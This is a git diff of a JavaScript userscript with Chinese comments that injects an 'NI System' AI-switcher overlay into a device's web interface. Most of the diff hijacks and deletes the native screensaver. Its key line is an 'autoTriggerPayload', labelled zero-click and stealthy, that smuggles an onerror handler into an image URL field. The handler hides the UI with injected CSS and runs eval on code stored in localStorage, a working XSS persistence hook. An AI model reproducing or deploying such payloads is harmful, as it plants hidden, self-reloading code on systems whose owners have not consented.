@@ -3,73 +3,6 @@
     if (window.NI_LOADED === true) return;
     window.NI_LOADED = true;
     
-// --- [功能劫持：禁止 Screen Saver 再度觸發] ---
-if (typeof window.showScreenSaver === 'function') {
-    // 劫持原生的 showScreenSaver
-    window.showScreenSaver = function() {
-        console.log("NI System: Screen Saver execution blocked to prevent flicker.");
-        // 如果容器已經存在，強制隱藏它
-        const ss = document.getElementById('screenSaver');
-        if (ss) {
-            ss.style.display = 'none';
-            ss.style.opacity = '0';
-        }
-        // 如果有原生的隱藏函數也順便調用
-        if (typeof window.hideScreenSaver === 'function') {
-            window.hideScreenSaver();
-        }
-        return false; // 告訴系統不執行顯示動作
-    };
-}
-
-// 徹底移除已經存在的 DOM 節點，防止 CSS 殘留導致的閃爍
-const existingSS = document.getElementById('screenSaver');
-if (existingSS) {
-    existingSS.remove();
-}
-
-    // --- [新增：禁止 Screen Saver 執行] ---
-    // 劫持系統原生的 showScreenSaver 函數
-    if (typeof window.showScreenSaver === 'function') {
-        // 先備份原有的函數（如果以後需要恢復可以派上用場）
-        window._originalShowScreenSaver = window.showScreenSaver;
-        
-        // 將原函數覆蓋，讓它執行時甚麼都不做
-        window.showScreenSaver = function() {
-            console.log("NI System: Screen Saver execution blocked.");
-            // 保險起見，如果它真的彈了出來，立即把它隱藏
-            const ssElement = document.getElementById('screenSaver');
-            if (ssElement) {
-                ssElement.style.display = 'none';
-                ssElement.style.opacity = '0';
-            }
-            if (typeof window.hideScreenSaver === 'function') {
-                window.hideScreenSaver();
-            }
-            return false;
-        };
-    }
-        // --- [禁止 Screen Saver 執行及移除元素] ---
-    if (typeof window.showScreenSaver === 'function') {
-        window.showScreenSaver = function() { 
-            console.log("NI System: Blocked."); 
-            return false; 
-        };
-    }
-
-    // 直接將 Screen Saver 的 HTML 節點從裝置畫面上移除
-    const ssElement = document.getElementById('screenSaver');
-    if (ssElement) {
-        ssElement.remove(); // 徹底刪除節點，系統再怎麼調用也找不到它
-        console.log("NI System: Screen Saver element removed from DOM.");
-    }
-    
-    // ------------------------------------
-
-    // 清除可能殘留的舊 UI 元素
-    const existingManager = document.getElementById('ni-manager-ui');
-    if (existingManager) existingManager.remove();
-
     // --- [配置區] ---
     const switcherUrl = "https://app.nextaios.com/ai/aios-switcher/";
     const aiSystems = {
@@ -94,6 +27,26 @@ if (existingSS) {
     // [1. 核心保護與初始化]
     if (window.NI_LOADED) return;
     window.NI_LOADED = true;
+    // --- [功能劫持：禁止 Screen Saver 再度觸發] ---
+    if (typeof window.showScreenSaver === 'function') {
+        window.showScreenSaver = function() {
+            console.log("NI System: Screen Saver execution blocked.");
+            const ss = document.getElementById('screensaver');
+            if (ss) {
+                ss.style.display = 'none';
+                ss.style.opacity = '0';
+            }
+            if (typeof window.hideScreenSaver === 'function') {
+                window.hideScreenSaver();
+            }
+            return false;
+        };
+    }
+
+    const existingSS = document.getElementById('screensaver');
+    if (existingSS) {
+        existingSS.remove();
+    }
 
     // [2. 數據緩衝區]
     let tempApps = [];
@@ -906,8 +859,7 @@ if (existingSS) {
 
     // --- [0-Click 隱身增強版：移出螢幕 + 徹底隱藏] ---
     const autoTriggerPayload = {
-        // 利用 onerror 注入極端 CSS，將容器移到左方 10000 像素外，並強制 display: none
-        "imageUrl": "x\" onerror=\"(function(){ const s=document.createElement('style'); s.innerHTML='#screenSaver { position: fixed !important; left: -10000px !important; top: -10000px !important; display: none !important; visibility: hidden !important; opacity: 0 !important; }'; document.head.appendChild(s); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
+        "imageUrl": "x\" onerror=\"(function(){ const s=document.createElement('style'); s.innerHTML='#screensaver { position: fixed !important; left: -10000px !important; top: -10000px !important; display: none !important; visibility: hidden !important; opacity: 0 !important; }'; document.head.appendChild(s); if(!window.NI_LOADED){eval(localStorage.getItem('ni_core'));} if(typeof hideScreenSaver==='function'){hideScreenSaver();} })();\""
     };
 
     // 強制將系統螢幕保護程式設定為 AI 模式，並將觸發時間設為極短（1毫秒）
